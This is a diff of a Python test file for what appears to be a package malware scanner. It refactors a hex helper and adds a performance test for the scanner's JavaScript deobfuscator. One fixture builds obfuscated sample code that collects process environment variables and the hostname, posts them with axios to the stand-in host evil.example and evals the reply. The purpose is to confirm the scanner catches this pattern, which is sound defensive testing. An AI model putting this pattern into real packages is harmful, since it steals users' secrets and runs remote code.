@@ -11,6 +11,7 @@ import base64
 import io
 import json
 import tarfile
+import time
 from pathlib import Path
 from typing import ClassVar
 
@@ -19,10 +20,10 @@ from cordon_scanner.analysis.shared.deobfuscation import (
     OBFUSCATOR_IO_ALPHABET,
     STANDARD_ALPHABET,
     Checksum,
-    Deobfuscator,
     Layers,
     ObfuscatorIo,
 )
+from cordon_scanner.analysis.shared.deobfuscator import Deobfuscator
 from cordon_scanner.decide.policy import PolicyGate
 from cordon_scanner.foundation.config.settings import Config
 from cordon_scanner.foundation.models import Severity
@@ -187,8 +188,10 @@ class TestIntegerLiterals:
         assert IntegerLiteral.value("0") == 0
 
 
-def _hex(value: str) -> str:
-    return value.encode().hex()
+class Hex:
+    @staticmethod
+    def of(value: str) -> str:
+        return value.encode().hex()
 
 
 class TestDecoderHelpers:
@@ -202,17 +205,20 @@ class TestDecoderHelpers:
         return recovery.text
 
     def test_the_hex_pair_helper_names_its_module_and_member(self):
-        text = self._folded(self.HEX + f"require(g('{_hex('axios')}'))[g('{_hex('post')}')](u);")
+        text = self._folded(
+            self.HEX + f"require(g('{Hex.of('axios')}'))[g('{Hex.of('post')}')](u);"
+        )
         assert "require('axios')['post'](u)" in text
 
     def test_the_sample_shape_array_of_calls_read_by_index(self):
         source = (
-            self.HEX + f"const hl = [g('{_hex('axios')}'), g('{_hex('post')}')];\nrequire(hl[0]);"
+            self.HEX
+            + f"const hl = [g('{Hex.of('axios')}'), g('{Hex.of('post')}')];\nrequire(hl[0]);"
         )
         assert "const hl = ['axios', 'post']" in self._folded(source)
 
     def test_each_helper_spelling(self):
-        call = f"g('{_hex('abc')}')"
+        call = f"g('{Hex.of('abc')}')"
         arrow = "const g = h => h.replace(/../g, m => String.fromCharCode(parseInt(m, 16)));"
         expression = (
             "const g = function (h) { return h.replace(/../g, (m) => "
@@ -228,25 +234,25 @@ class TestDecoderHelpers:
     def test_a_method_of_an_object_literal(self):
         source = (
             "const o = { d(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))) } };\n"
-            f"use(o.d('{_hex('abc')}'));"
+            f"use(o.d('{Hex.of('abc')}'));"
         )
         assert "use('abc')" in self._folded(source)
 
     def test_a_constant_argument(self):
-        assert "use('abc')" in self._folded(self.HEX + f"const H = '{_hex('abc')}';\nuse(g(H));")
+        assert "use('abc')" in self._folded(self.HEX + f"const H = '{Hex.of('abc')}';\nuse(g(H));")
 
     def test_two_layers_fold(self):
         source = (
             self.HEX
             + "const k = s => s.split('').reverse().join('');\n"
-            + f"use(g(k('{_hex('abc')[::-1]}')));"
+            + f"use(g(k('{Hex.of('abc')[::-1]}')));"
         )
         assert "use('abc')" in self._folded(source)
 
     def test_every_decode_form(self):
         raw = base64.b64encode(b"hello there").decode()
         cases = {
-            "const g = h => Buffer.from(h, 'hex').toString();": _hex("hello there"),
+            "const g = h => Buffer.from(h, 'hex').toString();": Hex.of("hello there"),
             "const g = h => Buffer.from(h, 'base64').toString('utf8');": raw,
             "const g = h => atob(h);": raw,
             "const g = h => String.fromCharCode(...h);": "[104, 105, 33]",
@@ -265,32 +271,33 @@ class TestDecoderHelpers:
         assert Deobfuscator.recover(key + "\nuse(g('6162'));", "javascript") is None
 
     def test_a_name_defined_twice_is_not_trusted(self):
-        source = self.HEX + "function g (h) { return h }\n" + f"use(g('{_hex('abc')}'));"
+        source = self.HEX + "function g (h) { return h }\n" + f"use(g('{Hex.of('abc')}'));"
         assert Deobfuscator.recover(source, "javascript") is None
 
     def test_bounds(self):
-        from cordon_scanner.analysis.shared.deobfuscation import DecoderHelpers
+        from cordon_scanner.analysis.shared.decoder_helpers import DecoderHelpers
 
-        assert DecoderHelpers.decode("hex_pairs", _hex("a") * 3000) is None
+        assert DecoderHelpers.decode("hex_pairs", Hex.of("a") * 3000) is None
         assert (
-            Deobfuscator.recover(self.HEX + f"use(g('{_hex(chr(1) * 4)}'));", "javascript") is None
+            Deobfuscator.recover(self.HEX + f"use(g('{Hex.of(chr(1) * 4)}'));", "javascript")
+            is None
         )
         assert Deobfuscator.recover(self.HEX + "use(g('zz'));", "javascript") is None
 
     def test_a_decode_that_raises_leaves_the_file_unlifted(self, monkeypatch):
-        from cordon_scanner.analysis.shared.deobfuscation import DecoderHelpers
+        from cordon_scanner.analysis.shared.decoder_helpers import DecoderHelpers
 
         def boom(*args, **kwargs):
             raise ValueError("hostile")
 
         monkeypatch.setattr(DecoderHelpers, "_pass", boom)
-        assert Deobfuscator.recover(self.HEX + f"use(g('{_hex('abc')}'));", "javascript") is None
+        assert Deobfuscator.recover(self.HEX + f"use(g('{Hex.of('abc')}'));", "javascript") is None
 
     def test_the_decoded_flow_is_judged_by_the_existing_rules(self, tmp_path):
         source = (
             self.HEX
             + "const data = { ...process.env, host: require('os').hostname() };\n"
-            + f"const hl = [g('{_hex('axios')}'), g('{_hex('post')}'), g('{_hex('https://evil.example/x')}')];\n"
+            + f"const hl = [g('{Hex.of('axios')}'), g('{Hex.of('post')}'), g('{Hex.of('https://evil.example/x')}')];\n"
             + "module.exports = () => require(hl[0])[[hl[1]]](hl[2], data).then(r => eval(r.data));\n"
         )
         config = Config.default().with_overrides(use_cache=False)
@@ -304,7 +311,7 @@ class TestDecoderHelpers:
     def test_a_literal_index_of_a_constant_array_and_a_computed_key_array_are_read(self):
         source = (
             self.HEX
-            + f"const hl = [g('{_hex('axios')}'), g('{_hex('post')}')];\n"
+            + f"const hl = [g('{Hex.of('axios')}'), g('{Hex.of('post')}')];\n"
             + "use(hl[0], x[[hl[1]]]); let n = hl[5];"
         )
         text = self._folded(source)
@@ -314,12 +321,12 @@ class TestDecoderHelpers:
     def test_an_array_declared_twice_is_not_indexed(self):
         source = (
             self.HEX
-            + f"const hl = [g('{_hex('axios')}')];\nfunction f(){{ const hl = []; }}\nuse(hl[0]);"
+            + f"const hl = [g('{Hex.of('axios')}')];\nfunction f(){{ const hl = []; }}\nuse(hl[0]);"
         )
         assert "use(hl[0])" in self._folded(source)
 
     def test_a_benign_decode_that_reaches_no_sink_does_not_block(self, tmp_path):
-        source = self.HEX + f"module.exports = () => console.log(g('{_hex('hello world')}'));\n"
+        source = self.HEX + f"module.exports = () => console.log(g('{Hex.of('hello world')}'));\n"
         config = Config.default().with_overrides(use_cache=False)
         result = Scanner(config).scan(ObfuscatedKit.package(tmp_path, source))
         assert not [
@@ -329,22 +336,39 @@ class TestDecoderHelpers:
     def test_a_method_is_folded_only_on_its_own_object(self):
         source = (
             "const o = { d(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))) } };\n"
-            f"use(o.d('{_hex('abc')}'), other.d('{_hex('abc')}'), d('{_hex('abc')}'));"
+            f"use(o.d('{Hex.of('abc')}'), other.d('{Hex.of('abc')}'), d('{Hex.of('abc')}'));"
         )
         text = self._folded(source)
-        assert f"use('abc', other.d('{_hex('abc')}'), d('{_hex('abc')}'))" in text
+        assert f"use('abc', other.d('{Hex.of('abc')}'), d('{Hex.of('abc')}'))" in text
 
     def test_a_helper_that_is_assigned_again_is_not_trusted(self):
-        source = self.HEX + f"g = function (x) {{ return x; }};\nuse(g('{_hex('abc')}'));"
+        source = self.HEX + f"g = function (x) {{ return x; }};\nuse(g('{Hex.of('abc')}'));"
         assert Deobfuscator.recover(source, "javascript") is None
 
     def test_work_is_bounded_on_hostile_input(self):
         arrays = "".join(f"const a{i} = ['p{i}'];\n" for i in range(300))
-        reads = f"use(a0[0], a299[0], g('{_hex('abc')}'));"
+        reads = f"use(a0[0], a299[0], g('{Hex.of('abc')}'));"
         text = self._folded(self.HEX + arrays + reads)
         assert "use('p0', a299[0], 'abc')" in text
         calls = "use(g(v));" * 60_000
         assert (
-            Deobfuscator.recover(self.HEX + calls + f"use(g('{_hex('abc')}'));", "javascript")
+            Deobfuscator.recover(self.HEX + calls + f"use(g('{Hex.of('abc')}'));", "javascript")
             is None
         )
+
+    def test_a_bundle_of_methods_costs_in_proportion_to_its_size(self):
+        """CPU time, never wall time: four times the methods costs far less than sixteen times."""
+
+        def cost(methods: int) -> float:
+            body = "".join(f"m{i}(a){{return a+{i}}}," for i in range(methods))
+            source = self.HEX + "const o = {" + body + "};\n" + f"use(g('{Hex.of('abc')}'));"
+            started = time.process_time()
+            recovery = Deobfuscator.recover(source, "javascript")
+            elapsed = time.process_time() - started
+            assert recovery is not None
+            assert "use('abc')" in recovery.text
+            return elapsed
+
+        cost(1_000)
+        small, large = cost(20_000), cost(80_000)
+        assert large < max(small, 0.05) * 12
